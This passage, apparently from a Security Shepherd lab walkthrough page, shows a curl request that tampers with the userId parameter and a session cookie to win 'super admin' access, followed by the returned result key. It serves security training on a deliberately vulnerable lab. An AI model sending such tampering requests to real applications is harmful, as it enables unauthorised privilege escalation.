</span><span class="hll"><span class="nv">URL</span><span class="o">=</span><span class="s1">&#39;https://securityshepherd.com/challenges/e40333fc2c40b8e0169e433366350f55c77b82878329570efa894838980de5b4&#39;</span>
</span>
curl -v --insecure  <span class="se">\</span>
     --header <span class="s2">&quot;X-Requested-With: XMLHttpRequest&quot;</span> <span class="se">\</span>
     --cookie <span class="s2">&quot;</span><span class="nv">$COOKIE</span><span class="s2">&quot;</span> <span class="se">\</span>
     --data-urlencode <span class="s2">&quot;userId=d3d9446802a44259755d38e6d163e820&quot;</span> <span class="se">\</span>
     --data-urlencode <span class="s2">&quot;secure=true&quot;</span> <span class="se">\</span>
     <span class="s2">&quot;</span><span class="nv">$URL</span><span class="s2">&quot;</span>
</pre></div>
</div>
<p>Running this gives the result key.</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="go">Welcome super admin! Your result key is as follows</span>
</span><span class="hll"><span class="go">iDd0TzjBfevGrXo2omd0+HkF8CveJaLlQcsHqOgRjV/dYwNhFuQ58MpPvzjRq/wroaBAJs1OfeGGWIHwGSLvZ2tVFAAocgNZFw1HXweUMJq+rdeMJmJEi5J6HqBfvB+MzL/EpnLtxdWWzXnQMGVYilL8W3aYJzH3gsU3UQugrVc=</span>
</span></pre></div>
</div>
</div>
</div>


           </div>
           <div class="articleComments">
            
           </div>
          </div>
          <footer>
  
    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
      
        <a href="security_shepherd_injection.html" class="btn btn-neutral float-right" title="3.15.5. Injection" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right"></span></a>
      
      
        <a href="security_shepherd_csrf.html" class="btn btn-neutral" title="3.15.3. CSRF" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left"></span> Previous</a>
      
    </div>
  

  <hr/>

  <div role="contentinfo">
    <p>
        &copy; Copyright 2017, bitbender.

    </p>
  </div>
  Built with <a href="http://sphinx-doc.org/">Sphinx</a> using a <a href="https://github.com/snide/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>. 

</footer>

        </div>
      </div>

    </section>

  </div>
  


  

    <script type="text/javascript">
        var DOCUMENTATION_OPTIONS = {
            URL_ROOT:'../',
            VERSION:'1.0.2',
            COLLAPSE_INDEX:false,
            FILE_SUFFIX:'.html',
            HAS_SOURCE:  true,
            SOURCELINK_SUFFIX: '.txt'
        };
    </script>
      <script type="text/javascript" src="../_static/jquery.js"></script>
      <script type="text/javascript" src="../_static/underscore.js"></script>
      <script type="text/javascript" src="../_static/doctools.js"></script>
      <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.0/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>

  

  
  
    <script type="text/javascript" src="../_static/js/theme.js"></script>
  

  
  
  <script type="text/javascript">
      jQuery(function () {
          SphinxRtdTheme.StickyNav.enable();
      });
  </script>
   

</body>
</html>